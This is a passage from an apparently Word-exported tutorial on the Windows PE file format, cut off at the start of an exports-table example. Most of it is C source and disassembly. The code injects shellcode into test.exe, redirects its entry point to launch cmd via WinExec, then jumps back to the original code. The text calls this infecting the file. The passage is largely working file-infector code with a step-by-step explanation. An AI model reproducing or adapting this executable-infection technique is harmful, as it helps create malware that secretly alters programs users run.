<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if(pmappedfile[positionofvcd]==0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>howmanyzeroes++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if(howmanyzeroes==69)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>else<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>howmanyzeroes=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>positionofvcd -= 65;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pimageoptionalheader-&gt;AddressOfEntryPoint
= positionofvcd + psection-&gt;VirtualAddress - psection-&gt;PointerToRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int sizeofvcd = sizeof(vcdcode);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hloadlibrary =
LoadLibrary(&quot;kernel32.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>haddresoffunction = (unsigned
long)GetProcAddress(hloadlibrary,&quot;WinExec&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for (i = 0; i &lt; 4 ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>vcdcode[sizeofvcd-10+i] =
haddresoffunction &gt;&gt; (i * 8);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for(i =0; i&lt;sizeofvcd ;i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile[positionofvcd+i]=vcdcode[i];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The best way to understand this
program is to run it and see the code being executed in the debugger. Thus at
the breakpoint interrupt click on cancel. The code shown below is displayed in
the debug window and it is similar to what is written in the vcdcode array. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Just to sum up. The entry point RVA
is changed to point to the newly inserted code and then file test.exe is
executed. The breakpoint interrupt gets called. The bytes that we have in the
vcdcode array are disassembled as<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Output<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>CC<span style="mso-spacerun:
yes">                   </span>int<span style="mso-spacerun: yes">        
</span>3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>55<span style="mso-spacerun:
yes">                   </span>push<span style="mso-spacerun: yes">       
</span>ebp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>8B EC<span style="mso-spacerun:
yes">                </span>mov<span style="mso-spacerun: yes">         </span>ebp,esp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>51<span style="mso-spacerun:
yes">                   </span>push<span style="mso-spacerun: yes">       
</span>ecx<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>C7 45 FC 63 6D 64 00 mov<span
style="mso-spacerun: yes">         </span>dword ptr [ebp-4],646D63h<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>6A 05<span style="mso-spacerun:
yes">                </span>push<span style="mso-spacerun: yes">       
</span>5<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>8B C5<span style="mso-spacerun:
yes">                </span>mov<span style="mso-spacerun: yes">        
</span>eax,ebp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>83 E8 04<span style="mso-spacerun:
yes">             </span>sub<span style="mso-spacerun: yes">        
</span>eax,4<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>50<span style="mso-spacerun:
yes">                   </span>push<span style="mso-spacerun: yes">       
</span>eax<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>B8 AF A7 E9 77<span
style="mso-spacerun: yes">       </span>mov<span style="mso-spacerun:
yes">         </span>eax,77E9A7AFh<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>FF D0<span style="mso-spacerun:
yes">                </span>call<span style="mso-spacerun: yes">       
</span>eax<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>8B E5<span style="mso-spacerun:
yes">                </span>mov<span style="mso-spacerun: yes">        
</span>esp,ebp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>5D<span style="mso-spacerun:
yes">                   </span>pop<span style="mso-spacerun: yes">        
</span>ebp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The explanation for the assembler
code is the same, as from the previous chapter. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first instruction is the
breakpoint interrupt CC. Then 55 becomes push ebp. One of the many reasons a
register is pushed on the stack is because its value is to be changed and
eventually the original value is to be restored at the end of the code. A
simple rule in assembler is whenever a register is changed, like decent people
once the task is done, it has to be restored back to its original value. The
next instruction replaces the contents of the ebp register with that of esp.
The esp register tracks down the stack each time a value is pushed or popped
off it. Thus by storing a copy of esp in ebp which will not be changed, we now
have a reference to original position of the stack is prior to the vcd code
being called. Besides there is now a fixed reference point off the stack to
refer to values on the stack. When our vcd code finishes, it should restore the
stack to its original value. Thus the vcd code should once again copy ebp back
to esp to restore the stack. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The actual work starts now. We push
ecx on the stack. By pushing its value, we have actually allocated 4 memory
locations on the stack, though its value is insignificant for the moment. The
stack moves down by 4 and hence the difference between esp and ebp will be 4.
Thus ebp-4 will represent the value we have just pushed on the stack. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The string cmd is to be placed on the
stack. Thus the next instruction copies the ASCII values of c, m and d 63,6d
and 64 on the stack at ebp-4, the position where we pushed the value of the ecx
register. Being a little endian machine the 63h or c comes last. The square
brackets in assembler reference a pointer.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>If ebp had a value 100, then
characters cmd would be stored at locations 96 onwards. Thus we have allocated
4 bytes on the stack and copied our string there. In assembler, we are allowed
to write to memory that has been previously allocated. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The WinExec function takes two
parameters, the name of the program to be executed and the initial mode the
window should be open in, The value 5 means normal, therefore we push 5 on the
stack, the parameters are to be pushed in the reverse way. Then the address of
where the string cmd starts in memory is to be placed which in our case is
ebp-4. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>-*-*-*<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>To make matters easier, we first mov
ebp into eax, subtract 4 from it and then push this value on the stack.
Finally, the function WinExec is called. However, our problem is that we have
no clue where this function starts in memory. Thus we use function LoadLibrary
to retrieve the address location of kernel32.dll as this dll that contains the
code of the WinExec functions starts in memory. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Then using function GetProcAddress,
we retrieve the address of this function in the dll and thus in memory. Once
the value is attained, using the mov instruction this value is placed into the
eax register. The op code B8 followed by the address in memory of our function
does this job. Then the address of WinExec is to be placed at this point which
is 10 bytes from the end. For this reason, we extract each bytes of the address
of WinExec which is 77e9a7af and place in into our array vcdcode. This value of
WinExec will change from Windows version to version and service pack and hence
it is not hard coded. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Once its address is obtained, it is
moved into the eax register and then the call eax op code is used to call the
code of WinExec. Resultantly, this opens the DOS command box. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Mission Accomplished.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The clean up task now requires the
stack to be placed back to its original so we move the value of ebp back into esp,
thus saving the value of ebp on the stack. As the stack is now on this value,
we simply pop the original value of ebp back into the ebp register. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>A small glitch here is that in spite
of opening the dos box, the original code does not get called at all. This is
rectified in the next program.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>All that this program does is hands
over control back to the original code.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>struct section {<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>BYTE<span style="mso-spacerun:
yes">    </span>Name[8];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>SizeOfRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>PointerToRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>char a[16];<span style="mso-spacerun:
yes">    </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char
vcdcode[]=&quot;\xcc\x55\x8B\xEC\x51\xC7\x45\xFC\x63\x6D\x64\x00\x6A\x05\x8b\xc5\x83\xe8\x04\x50\xB8\xcc\xcc\xcc\xcc\xFF\xD0\x8B\xE5\x5d&quot;;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>section *psection;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HMODULE hloadlibrary;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>long positionofvcd,haddresoffunction;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int howmanyzeroes=0,i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_OPTIONAL_HEADER
*pimageoptionalheader = (IMAGE_OPTIONAL_HEADER *)((unsigned char *)pimagefileheader+sizeof(IMAGE_FILE_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>psection = (struct section*)((char
*)pimageoptionalheader + sizeof(IMAGE_OPTIONAL_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int totalsize =
psection-&gt;PointerToRawData + psection-&gt;SizeOfRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for(positionofvcd=psection-&gt;PointerToRawData;positionofvcd
&lt;= totalsize;positionofvcd++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if(pmappedfile[positionofvcd]==0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>howmanyzeroes++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if(howmanyzeroes==69)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>else<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>howmanyzeroes=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>positionofvcd -= 65;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>long goingback =
pimageoptionalheader-&gt;AddressOfEntryPoint+pimageoptionalheader-&gt;ImageBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pimageoptionalheader-&gt;AddressOfEntryPoint
= positionofvcd + psection-&gt;VirtualAddress - psection-&gt;PointerToRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int sizeofvcd = sizeof(vcdcode);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hloadlibrary =
LoadLibrary(&quot;kernel32.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>haddresoffunction = (unsigned
long)GetProcAddress(hloadlibrary,&quot;WinExec&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for (i = 0; i &lt; 4 ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>vcdcode[sizeofvcd-10+i] =
haddresoffunction &gt;&gt; (i * 8);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for(i =0; i&lt;sizeofvcd ;i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile[positionofvcd+i]=vcdcode[i];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char
jumpback[]=&quot;\xB8\xbb\xbb\xbb\xbb\xff\xe0&quot;; <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for (i = 0; i &lt; 4 ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>jumpback[1+i] = goingback &gt;&gt; (i
* 8);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for(i=0; i&lt;7 ;i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile[positionofvcd+sizeofvcd+i-1]=jumpback[i];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The AddressOfEntryPoint member stores
the address of code that is to be executed. Thus before changing its value to point
to our vcd code, we save the original value in a variable called goingback. The
point to be noted is that the address is an RVA therefore to reach the actual
physical address we add the ImageBase value to it. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Next is we create an array jumpback
that will carry code that jumps back to the original entry point. Once again it
starts with op code b8 that moves a value into the eax register. As before, a
for loop is used to write the actual jump address in this array using the
goingback variable. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Then these 7 bytes are added to the
end of the vcd so that after the dos box gets created and it is shut down, the
original code is executed. The actual bytes that get executed are as follows.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>B8 20 24 01 01<span
style="mso-spacerun: yes">   </span>mov<span style="mso-spacerun: yes">        
</span>eax,1012420h<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>FF E0 jmp<span style="mso-spacerun:
yes">         </span>eax<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The difference between a call and jmp
instruction is that in the jmp instruction the next instruction address is not
saved on the stack there is no need to return back. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus the code will infect a file in
such a way that each time the file is executed, a dos box gets created and then
the original code gets called.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Exports Table.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=Framecontents><span style='color:#000066'>e.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void __declspec(dllexport) abc()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void __declspec(dllexport) pqr()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void xyz()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void aaa()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void bbb()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void ccc()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
